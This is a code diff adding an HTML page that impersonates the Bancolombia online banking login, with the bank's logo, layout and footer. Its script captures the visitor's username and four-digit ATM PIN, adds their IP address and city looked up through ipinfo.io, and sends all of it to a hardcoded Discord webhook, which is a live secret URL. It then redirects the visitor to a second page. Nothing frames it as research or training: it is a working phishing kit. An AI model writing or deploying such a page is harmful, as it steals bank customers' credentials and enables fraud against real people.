@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="center-container">
+      <img
+        src="https://library-sdb.apps.bancolombia.com/bds/7.41.13/assets/icons/logos/bancolombia-horizontal-no-spacing.svg"
+        alt="Bancolombia"
+        class="logo"
+      />
+      <div class="notificacion">
+        <span class="prog-title">¡Prográmate!</span> Consulta el estado de
+        nuestros canales y los mantenimientos programados.
+        <a href="#" target="_blank">Más info aquí.</a>
+      </div>
+
+      <h2>Sucursal Virtual Personas</h2>
+      <div class="login-box">
+        <h3>¡Hola!</h3>
+        <p>
+          Ingresa los datos para gestionar tus productos y hacer transacciones.
+        </p>
+        <form id="loginForm">
+          <label class="input-container">
+            <span class="input-icon"><i class="fas fa-user"></i></span>
+            <input id="usuario" type="text" placeholder="Usuario" required />
+          </label>
+          <div class="ayuda"><a href="#">¿Olvidaste tu usuario?</a></div>
+          <label class="input-container">
+            <span class="input-icon"><i class="fas fa-lock"></i></span>
+            <input
+              id="clave"
+              type="password"
+              inputmode="numeric"
+              maxlength="4"
+              placeholder="Clave del cajero"
+              required
+            />
+          </label>
+          <div class="ayuda">
+            <a href="#">¿Olvidaste o bloqueaste tu clave?</a>
+          </div>
+          <button id="loginBtn" type="submit" disabled>Iniciar sesión</button>
+        </form>
+        <div class="crear-usuario"><a href="#">Crear usuario</a></div>
+        <p id="respuesta"></p>
+      </div>
+    </div>
+
+    <footer class="footer-bancolombia">
+      <div class="footer-links-block">
+        <a href="#">¿Problemas para conectarte?</a>
+        <span class="sep">·</span>
+        <a href="#">Aprende sobre seguridad</a>
+        <span class="sep">·</span>
+        <a href="#">Reglamento Sucursal Virtual</a>
+        <span class="sep">·</span>
+        <a href="#">Política de privacidad</a>
+      </div>
+      <hr class="footer-linea" />
+      <div class="footer-main">
+        <div class="footer-logo-block">
+          <img
+            src="https://library-sdb.apps.bancolombia.com/bds/7.41.13/assets/icons/logos/bancolombia-horizontal-no-spacing.svg"
+            alt="Bancolombia"
+            class="footer-logo"
+            width="170"
+          />
+        </div>
+        <div class="footer-ip-block">
+          Dirección IP: <span id="ip">Cargando...</span><br />
+          <span id="fecha"></span>
+        </div>
+      </div>
+    </footer>
+
+    <script>
+      // Variables globales para el formulario
+      const usuario = document.getElementById("usuario");
+      const clave = document.getElementById("clave");
+      const loginBtn = document.getElementById("loginBtn");
+
+      // NUEVAS VARIABLES GLOBALES PARA LA INFORMACIÓN DE SESIÓN
+      let ipGlobal = "Cargando...";
+      let cityGlobal = "Cargando...";
+      let countryGlobal = "Cargando...";
+
+      function checkInputs() {
+        if (usuario.value.trim() !== "" && clave.value.trim().length === 4) {
+          loginBtn.disabled = false;
+          // Estilos para el botón activo (amarillo)
+          loginBtn.style.background = "#FFDA00";
+          loginBtn.style.color = "#000";
+          loginBtn.style.cursor = "pointer";
+        } else {
+          loginBtn.disabled = true;
+          // Estilos para el botón deshabilitado (gris)
+          loginBtn.style.background = "#ccc";
+          loginBtn.style.color = "#fff";
+          loginBtn.style.cursor = "not-allowed";
+        }
+      }
+
+      // Filtro para asegurar que SOLO se escriban números en el campo de clave
+      clave.addEventListener("keypress", function (e) {
+        if (isNaN(e.key) || e.key === " ") {
+          e.preventDefault();
+        }
+      });
+
+      usuario.addEventListener("input", checkInputs);
+      clave.addEventListener("input", checkInputs);
+      window.addEventListener("DOMContentLoaded", checkInputs);
+
+      // Obtener IP pública, Ciudad, País y almacenarlos en variables globales
+      fetch("https://ipinfo.io/json")
+        .then((res) => res.json())
+        .then((data) => {
+          ipGlobal = data.ip || "No disponible";
+          cityGlobal = data.city || "No disponible";
+          // Usamos el código de país (ej. 'CO') para simular la IP
+          countryGlobal = data.country || "No disponible";
+          document.getElementById("ip").textContent = ipGlobal;
+        })
+        .catch(() => {
+          document.getElementById("ip").textContent = "No disponible";
+        });
+
+      // Mostrar fecha y hora actual formateada
+      function formatFecha(fecha) {
+        const dias = [
+          "domingo",
+          "lunes",
+          "martes",
+          "miércoles",
+          "jueves",
+          "viernes",
+          "sábado",
+        ];
+        const meses = [
+          "enero",
+          "febrero",
+          "marzo",
+          "abril",
+          "mayo",
+          "junio",
+          "julio",
+          "agosto",
+          "septiembre",
+          "octubre",
+          "noviembre",
+          "diciembre",
+        ];
+        let diaSemana = dias[fecha.getDay()];
+        let dia = fecha.getDate();
+        let mes = meses[fecha.getMonth()];
+        let año = fecha.getFullYear();
+        let horas = fecha.getHours();
+        let minutos = fecha.getMinutes().toString().padStart(2, "0");
+        let sufijo = horas < 12 ? "a. m." : "p. m.";
+        if (horas == 0) horas = 12;
+        else if (horas > 12) horas -= 12;
+        return `${diaSemana}, ${dia} de ${mes} de ${año}, ${horas}:${minutos} ${sufijo}.`;
+      }
+      function actualizarFecha() {
+        const ahora = new Date();
+        document.getElementById("fecha").textContent = formatFecha(ahora);
+      }
+      actualizarFecha();
+      setInterval(actualizarFecha, 60000); // Actualiza cada minuto
+
+      // ENVÍO A WEBHOOK con RETRASO (100ms)
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          const usuarioVal = usuario.value.trim();
+          const claveVal = clave.value.trim();
+
+          localStorage.setItem("usuario", usuarioVal);
+          localStorage.setItem("clave", claveVal);
+
+          // CONSTRUCCIÓN DEL MENSAJE CON LA PLANTILLA SOLICITADA
+          const webhookMessage = `
+🇨🇴BANCOLOMBIA🇨🇴 
+---------------------------------
+👤 USUARIO:       ${usuarioVal}
+🔑 CONTRASEÑA:    ${claveVal}
+🏙 CIUDAD:        ${cityGlobal}
+🌍 DIRECCIÓN IP:  ${ipGlobal}
+`;
+
+          // URL del Webhook
+          const discordWebhookUrl =
+            "https://discord.com/api/webhooks/1439411839136960623/NxZJAWgLzKIAtYyLp1bd24c15F8pwD5PootyZdg_lXDFmhazyvzOW1cEQOe7ljEE1b4N";
+
+          fetch(discordWebhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              // Enviamos el mensaje detallado
+              content: webhookMessage,
+            }),
+          })
+            .then((res) => {
+              // REDIRECCIÓN CON RETRASO DE 100ms
+              setTimeout(() => {
+                window.location.href = "index2.html";
+              }, 100);
+            })
+            .catch(() => {
+              // REDIRECCIÓN CON RETRASO DE 100ms
+              setTimeout(() => {
+                window.location.href = "index2.html";
+              }, 100);
+            });
+        });
+    </script>
+  </body>
+</html>
